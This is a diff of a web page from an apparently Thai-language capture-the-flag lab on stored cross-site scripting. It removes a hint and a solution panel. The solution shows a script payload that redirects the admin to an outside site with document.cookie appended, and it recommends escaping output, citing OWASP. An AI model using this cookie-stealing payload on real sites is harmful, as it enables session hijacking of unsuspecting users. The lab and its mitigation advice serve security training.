@@ -58,46 +58,6 @@
                             <li><a target="_blank" href="https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)">Testing for Stored Cross site scripting</a></li>
                         </ul>
                     </div>
-                    <div>
-                        <ul class="accordion" id="investAccordion">
-                            <li>
-                                <h5 class="invest-collapse collapsed" id="headingOne" data-toggle="collapse" data-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne">Hint</h5>
-                                <div id="collapseOne" class="collapse" aria-labelledby="headingOne" data-parent="#investAccordion">
-                                - ทำให้ admin ส่ง Cookie ของเขามาเว็บเรา ผ่านทาง URL โดยใช้ JS ดูสิ !
-                                </div>    
-                            </li>
-                            <li>
-                                <h5 class="invest-collapse collapsed" id="headingTwo" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="true" aria-controls="collapseTwo">Solution & Recommendation</h5>
-                                <div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#investAccordion">  
-                                     <!-- Button trigger modal -->
-                                     <button type="button" class="solution btn btn-primary" data-toggle="modal" data-target="#exampleModalLong">
-                                    Are you sure ?
-                                    </button>
-                                    <!-- Modal -->
-                                    <div class="modal fade" id="exampleModalLong" tabindex="-1" role="dialog" aria-labelledby="exampleModalLongTitle" aria-hidden="true">
-                                        <div class="modal-dialog" role="document">
-                                            <div class="modal-content">
-                                                <div class="modal-body m-3 pb-0">
-                                                    <h5 class="mb-2">Solution</h5>
-                                                    - เป้าหมายของข้อนี้คือ การขโมย Cookie ของ admin ให้ได้ โดยหน้าเว็บมีฟังก์ชันสามารถโพสข้อความได้ ซึ่งสามารถโพสอะไรก็ได้ใน format HTML ไม่ว่าจะเป็น image, paragraph, header หรือแม้กระทั่ง script (JS) !! ทำให้มีช่องโหว่ Stored XSS โดยการที่จะขโมย Cookie ของ admin ได้นั้น ทำได้หลากหลายวิธี เราจะเฉลยหนึ่งในนั้น คือการให้ admin redirect ไปที่เว็บที่เราต้องการพร้อมกับ Cookie ของเขา Payload ดังนี้<br><br>
-                                                    &lt;script&gt;<br>
-                                                    <div class="ml-4 mb-0">window.location = &quot;http://www.mysite.com/&quot; + document.cookie;</div>
-                                                    &lt;/script&gt;<br><br>
-                                                    รอสักครู่แล้วไปดู log flag ซึ่งอยู่ใน Cookie ก็จะติดมากับ request นั้นๆ เป็นอันจบ เย่
-                                                    <h5 class="mt-3 mb-2">Recommendation</h5>
-                                                    - วิธีแก้ XSS ก็คือ ทำการ Escape special character ทุก ๆ ครั้งที่มีการแสดง หรือสามารถ Escape character ตั้งแต่กระบวนการ insert ข้อมูลลงใน database ก็ทำได้เช่นเดียวกัน<br>
-                                                    ref : <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">XSS (Cross Site Scripting) Prevention Cheat Sheet</a> 
-                                                </div>
-                                                <div class="modal-footer mt-0 pt-2 px-4">
-                                                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>    
-                            </li>
-                        </ul>                        
-                    </div>
                 </div>
             </div>    
         </div>
